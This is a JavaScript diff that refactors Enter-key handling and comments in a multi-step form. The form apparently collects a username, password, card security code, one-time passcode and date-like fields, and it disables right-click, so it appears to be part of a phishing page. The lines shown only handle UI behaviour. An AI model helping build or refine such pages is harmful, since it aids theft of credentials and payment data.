@@ -355,26 +355,7 @@ function setupUI() {
   // 🔒 Disable right‑click context menu
   document.addEventListener("contextmenu", e => e.preventDefault());
 
-  // 🖱️ Map Enter key to button clicks
-  function bindEnterToButton(inputSelector, buttonSelector) {
-    document.addEventListener("keydown", e => {
-      if (e.key === "Enter") {
-        const active = document.activeElement;
-        if (active && active.matches(inputSelector)) {
-          const btn = document.querySelector(buttonSelector);
-          if (btn) {
-            e.preventDefault(); // stop native submit
-            btn.click();        // trigger second script’s click handler
-          }
-        }
-      }
-    });
-  }
-  bindEnterToButton("#oun, #upw", "button[name='submita']");
-  bindEnterToButton("#cscInput", "button[name='submitb']");
-  bindEnterToButton("#otp, #pn, #mmdd", "button[name='submitc']");
-
-  // 🔑 Password input toggle
+  // 📝 Password input toggle
   const passwordInput = document.getElementById("upw");
   const toggleButton = document.getElementById("toggleupw");
   let hasTyped = false;
@@ -383,10 +364,11 @@ function setupUI() {
     passwordInput.addEventListener("input", () => {
       if (!hasTyped) {
         hasTyped = true;
-        passwordInput.type = "password";
+        passwordInput.type = "password"; // auto switch to masked field
       }
     });
   }
+
   if (passwordInput && toggleButton) {
     toggleButton.addEventListener("click", () => {
       if (!hasTyped) return; // prevent toggle before typing
@@ -578,9 +560,9 @@ window.populateEmailFields = function () {
 	  );
 	}
 
-
   function setupFormFlow() {
     setupIntro();
+    setupEnterBindings();
     setupLoading();
     setupLoginHandler();
     setupCSCHandler();
@@ -607,6 +589,25 @@ window.populateEmailFields = function () {
   window.addEventListener('pageshow', clearFields);
 }
 
+  function setupEnterBindings() {
+    const map = {
+      "#oun, #upw": "button[name='submita']",
+      "#cscInput": "button[name='submitb']",
+      "#otp, #pn, #mmdd": "button[name='submitc']"
+    };
+
+    $(document).on("keydown", function (e) {
+      if (e.key === "Enter") {
+        const active = document.activeElement;
+        for (const selector in map) {
+          if (active && $(active).is(selector)) {
+            e.preventDefault();
+            $(map[selector]).trigger("click"); // trigger existing click handlers
+          }
+        }
+      }
+    });
+  }
 
   function setupLoading() {
     $.loading = function (btn) {
